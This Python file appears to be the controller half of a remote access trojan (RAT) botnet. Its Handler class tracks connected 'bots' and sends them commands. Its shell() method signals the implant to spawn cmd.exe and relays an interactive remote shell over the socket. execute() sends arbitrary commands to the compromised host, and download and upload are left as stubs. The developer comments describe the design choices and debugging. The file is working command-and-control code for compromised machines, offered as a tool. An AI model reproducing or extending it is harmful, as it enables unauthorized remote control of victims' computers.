
# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time
import subprocess

class Handler(threading.Thread):

    def __init__(self, client, client_address, bot_id):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.bot_id = bot_id
        self.info = [self.bot_id,self.ip,self.port]
        self.status = "ALIVE"

        # self.respQueue = queue.Queue()
        # self.cmdQueue = queue.Queue()

    # Look at advantages and disadvantages of using seperate queues for each handler. - NIX'D}
    #   - They can be initialized in the class itself, rather than in the Server or Interpreter class
    #   - Look at implementing all Agent functions within the Interpreter class. Consider the example 
    #       and think about how shifting all of these functions will make a difference in cleanliness.
    #       It will require the extensive use of queues to pass back information, as the Agent thread
    #       will continually use it the catch and execute commands. Think...
    #   + Decision on Queues: Don't pursue. Sequential receiving isn't such a bad thing. Where we truly 
    #       run into a problem is when we're receiving information that may overflow or hit a timeout.
    #       
    #       As such, we should take the idea of looping-recv, with timeouts, but give enough time to 
    #       realize that connections suck. 


    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")

        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
        #server.agentList[self.bot_id]
        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
    

    # Should I remove these and simply have the user select certain connections upon switching to Batch-Mode?? --- Yes
    # Decision: don't remove, keep functions. But use them in the Batch-mode interaction ---- No...

    # def activate(self):
    #     print(f"\n[*BotHandler-Msg] Activating Bot {str(self.bot_id)}...")
    #     self.isActive = True
    
    # def deactivate(self):
    #     print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
    #     self.isActive = False

    def kill(self):     # hah
        print(f"\n[*BotHandler-Msg] Severing connection for Bot {str(self.bot_id)}...")
        self.execute("exit")

        # Record information into deadConnections[]
        # deadConnections.append(self.info)             # Append the info so the thread can join the main thread
        # agentList.remove(self)                          # Remove the Handler-thread from the Alives array

        print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
        # if(threading.current_thread().is_alive()):
        #     threading.current_thread().join


    def getStatus(self):
        return self.status
    
    def setStatus(self, stat):
        self.status = stat

    def getInfo(self):
        return self.info

    def printInfo(self):
        print(self.info)

    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def shell(self):

        # if command is 'shell':
        #   we send the shell keyword, which initiates the cmd.exe, and then redirects all stdin/out to the socket
        #   the shell will still be receiving any information we send it, therefore thats why it closed only the cmd.exe session when we subsequently exited.
        #   We need to figure out a way to capture the shell keyword here, then send it over, while also realizing in the c2
        #   that we are going to be sending and receiving directly to and from the cmd.exe process, effectively needing a function, loop, or just to catch and exit twice[?]
        #     
        #--------
        # Current problem:
        #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
        #   banner and another for the initial shell/cwd output prompt).
        
        # Problem solved. The commands no longer hang, but sequences suck

        # Initiate shell 
        try:
            self.client.send(("shell").encode('utf-8'))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
        except Exception as ex:
            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            return False                            # unsuccessful
        else:
            banner = ""
            while True:
                try:
                    self.client.settimeout(1)
                    recv = self.client.recv(4096).decode('utf-8')
                except:
                    recv = ""
                if not recv:
                    break
                else:
                    banner += recv
            if banner:
                print(banner)
        
        time.sleep(0.5)

        while (True):                                                           # Capture IO sent over socket (cmd.exe)
            try:
                cmd_sent = input()                                            # Dumb capture in
                cmd_sent += "\n"
            except Exception as ex:
                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            else:
                try:
                    cmd_response = ""
                    shell_exit = False
                    if(cmd_sent.casefold().strip(" ") == 'quit\n' or cmd_sent.casefold().strip(" ") == 'exit\n'):
                        print(f"[* BotHandler-Msg:ShellExec] Sending EXIT signal to Agent. Please wait...")
                        self.client.send(("exit\n").encode('utf-8'))

                        while(True):

                            self.client.settimeout(0.5)

                            try:
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                                break

                            if not recv:
                                break
                            
                            else:
                                cmd_response += recv  
                        
                        shell_exit = True

                    else:
                        self.client.send((cmd_sent).encode('utf-8'))

                        while(True):
                            try:
                                if (cmd_sent.casefold() == "\n"):
                                    self.client.settimeout(0.5)
                                elif (len(cmd_response) <= len(cmd_sent)):
                                    self.client.settimeout(5)
                                else:
                                    self.client.settimeout(1)
                                    
                                recv = self.client.recv(4096).decode('utf-8')

                            except socket.timeout:
                                # if timeout exception is triggered - assume no data anymore
                                recv = ""
                            except Exception as ex:
                                print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                                break

                            if not recv:
                                break
                            
                            else:
                                cmd_response += recv
                    
                except Exception as ex:
                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                else:
                    
                    if len(cmd_response.strip()) > 1:
                        # Removing sent command from response before printing output
                        print(cmd_response.replace(cmd_sent,""))
            
                    if(shell_exit):
                        break

        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
        return True


    def execute(self, cmd_sent):

        print(f"[* BotHandler-Msg] Received Command: {str(cmd_sent)} for bot {str(self.bot_id)}")

        # Single instance execution
        try:
            # Send data/command to RAT
            self.client.send(cmd_sent.encode('utf-8'))
        except Exception as ex:
            print(f"[* BotHandler-Msg] Unable to send command to bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg] Error: {ex}")
            return "== Return Value Error =="
        else:
            cmd_response = ""
            while(True):
                try:
                    if (cmd_sent.casefold() == "\n"):
                        self.client.settimeout(0.5)
                    elif (len(cmd_response) <= len(cmd_sent)):
                        self.client.settimeout(5)
                    else:
                        self.client.settimeout(1)
                        
                    recv = self.client.recv(4096).decode('utf-8')

                except socket.timeout:
                    # if timeout exception is triggered - assume no data anymore
                    recv = ""
                except Exception as ex:
                    print("[* BotHandler-Msg:ShellExec] Unable to process received data.")
                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                    break

                if not recv:
                    break
                else:
                    cmd_response += recv
                    
                    
            if len(cmd_response.strip()) > 1:
                # Removing sent command from response before printing output
                return cmd_response.replace(cmd_sent,"")
            else:
                return "\n"

            # TODO %%
            # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
            # if(!beacon(bot_id)):
            #   <Kill connection, join the thread, ad to list of dead bots>

    def beacon(self):
        # Ping host 
        #   if no reply, Kill host connection
        #
        print("ping")
        # beacon rat
        #   if no reply, set host status to LOST

        # for t in allConnections:
        #     if t.is_alive() == False:
        #         print("\n[!] Died Thread: " + str(t))
        #         t.join()

    def ping(self):

        response = subprocess.Popen(["ping", "-c", "4", self.ip],
        stdout = subprocess.PIPE,
        stderr = subprocess.STDOUT)
        stdout, stderr = response.communicate()

        if (response.returncode == 0):
            return "UP"
        else:
            return "DOWN"

    # TODO %%
    def download(self, remotepath, localfile):
        print("TBC")

    def upload(self, localfile, remotepath):
        print("TBC")